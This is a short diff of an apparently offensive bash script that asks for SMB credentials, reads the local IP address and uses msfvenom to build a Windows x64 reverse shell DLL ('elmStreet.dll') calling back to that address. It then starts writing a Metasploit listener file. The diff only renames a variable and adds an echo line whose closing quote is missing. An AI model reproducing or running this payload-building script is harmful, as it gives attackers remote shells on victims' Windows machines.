@@ -10,7 +10,8 @@ read -p "0=freddy(smb/pass)> " pass
 
 echo -e "[*] Grabbing internal hostname"
 sleep 2
-server=$(hostname -I | awk '{print $1}')
+ipaddr=$(hostname -I | awk '{print $1}')
+echo "[?] Use $ipaddr
 
 echo -e "[*] Enter Port Number(default 4444): "
 read -p "0=freddy(port)> "
@@ -23,7 +24,7 @@ clear
 
 echo -e "[*] Creating Payload"
 sleep 1
-msfvenom -p windows/x64/reverse_shell_tcp LHOST=$server LPORT=$port -o elmStreet.dll
+msfvenom -p windows/x64/reverse_shell_tcp LHOST=$ipaddr LPORT=$port -o elmStreet.dll
 # listener
 touch dreams.rc
 	echo "use exploit/multi/handler
